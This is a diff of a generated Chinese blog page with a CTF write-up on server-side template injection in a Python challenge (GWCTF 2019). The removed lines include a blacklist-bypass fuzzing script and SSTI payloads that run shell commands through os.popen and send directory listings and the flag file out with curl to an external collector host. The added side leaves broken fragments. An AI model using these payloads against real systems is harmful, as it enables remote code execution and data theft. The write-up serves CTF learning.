@@ -9,7 +9,8 @@
 题解原本以为是sql注入，没想到是ssti
 而且虽然是python后端，但加了个php模式的报错和index.php路由
 
-&amp;#123;&amp;#123;被过滤，用&amp;#123;% if ... %&amp;#125;&amp;#123;% endif %&amp;">
+&amp;#96;
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -45,7 +46,7 @@
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -520,12 +521,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/SSTI/">
@@ -567,14 +568,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    360
+                    40
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -592,74 +593,11 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909103234948.png"></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909103234948.png"></p>
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>原本以为是sql注入，没想到是ssti</p>
 <p>而且虽然是python后端，但加了个php模式的报错和index.php路由</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909110224214.png"></p>
-<p><code>&#123;&#123;</code>被过滤，用<code>&#123;% if ... %&#125;&#123;% endif %&#125;</code>代替，用<code>os.popen</code>+<code>curl</code>来带出数据</p>
-<p>有黑名单过滤，非递归模式，存在逻辑错误</p>
-<p>比如输入<code>imporgetattrt</code></p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909124515989.png"></p>
-<p>所以需要找到最后一个。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
-<span class="token keyword">import</span> time
-
-<span class="token keyword">import</span> requests
-<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
-
-url <span class="token operator">=</span> <span class="token string">"http://c21719f3-6650-4fee-b5de-7113e95abbb1.node4.buuoj.cn:81/"</span>
-
-blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'args'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span>
-             <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'from_pyfile'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span>
-             <span class="token string">'self'</span><span class="token punctuation">,</span> <span class="token string">'item'</span><span class="token punctuation">,</span> <span class="token string">'getitem'</span><span class="token punctuation">,</span> <span class="token string">'getattribute'</span><span class="token punctuation">,</span> <span class="token string">'func_globals'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">]</span>
-
-
-<span class="token keyword">def</span> <span class="token function">find_unused_word</span><span class="token punctuation">(</span>words<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    used_word <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"[a-zA-Z]+"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> words <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> used_word<span class="token punctuation">]</span>
-
-
-<span class="token keyword">def</span> <span class="token function">replace_fuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    payload <span class="token operator">=</span> <span class="token string">"&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl https://sfg56dsf.free.beeceptor.com/?i=`ls / |base64`') %&#125;1&#123;% endif %&#125;"</span>
-    unused_word <span class="token operator">=</span> find_unused_word<span class="token punctuation">(</span>blacklist<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>unused_word<span class="token punctuation">)</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> unused_word<span class="token punctuation">:</span>
-        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-            <span class="token string">"name"</span><span class="token punctuation">:</span> i
-        <span class="token punctuation">&#125;</span>
-        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-        <span class="token keyword">if</span> <span class="token string">"hello !"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-                <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"cla"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"ss"</span>
-            <span class="token punctuation">&#125;</span>
-            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-            <span class="token keyword">if</span> <span class="token string">"class"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] find </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
-        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">def</span> <span class="token function">check_fuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
-        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-            <span class="token string">"name"</span><span class="token punctuation">:</span> i
-        <span class="token punctuation">&#125;</span>
-        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>i<span class="token punctuation">)</span>
-        <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
-    replace_fuzz<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>payload</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl https:&#x2F;&#x2F;sfg56dsf.free.beeceptor.com&#x2F;?i&#x3D;&#96;ls &#x2F; |base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-none"><code class="language-none">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl https:&#x2F;&#x2F;sfg56dsf.free.beeceptor.com&#x2F;?i&#x3D;&#96;cat &#x2F;flag_1s_Hera |base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909110224214.png"></p>
+<p>&#96;</p>
 
                 
             </div>
@@ -724,12 +662,12 @@ blacklist <span class="token operator">=</span> <span class="token punctuation">
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/SSTI/">
@@ -1083,12 +1021,12 @@ blacklist <span class="token operator">=</span> <span class="token punctuation">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -1136,12 +1074,12 @@ blacklist <span class="token operator">=</span> <span class="token punctuation">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/CVE/">
